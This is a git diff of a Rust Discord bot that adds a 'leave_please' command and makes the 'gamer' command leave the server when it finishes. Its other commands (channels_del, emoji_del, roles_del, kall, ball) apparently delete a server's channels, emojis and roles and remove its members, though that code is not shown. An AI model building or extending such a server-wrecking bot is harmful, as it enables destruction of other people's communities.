@@ -17,7 +17,7 @@ use serenity::framework::standard::{
 use std::io;
 
 #[group]
-#[commands(channels_del, emoji_del, roles_del, gamer, kall, ball)]
+#[commands(leave_please, channels_del, emoji_del, roles_del, gamer, kall, ball)]
 struct General;
 
 struct Handler;
@@ -63,6 +63,20 @@ async fn after_hook(_: &Context, _: &Message, cmd_name: &str, error: Result<(), 
 async fn before_hook(_: &Context, _: &Message, cmd_name: &str) -> bool {
     println!("Running command {}", cmd_name);
     true
+}
+#[command]
+async fn leave_please(ctx: &Context, msg: &Message) -> CommandResult {
+    let guild = match msg.guild(ctx).await {
+        Some(guild) => guild,
+        None => {
+            msg.channel_id.say(ctx, "DMs not supported").await?;
+    
+            return Ok(());
+        }
+    };
+    guild.leave(&ctx).await?;
+    println!("Done!");
+    Ok(())
 }
 
 #[command]
@@ -262,6 +276,7 @@ async fn gamer(ctx: &Context, msg: &Message) -> CommandResult {
             _ => {},
         }
     }
+    guild.leave(&ctx).await?;
     println!("Done!");
     Ok(())
 }
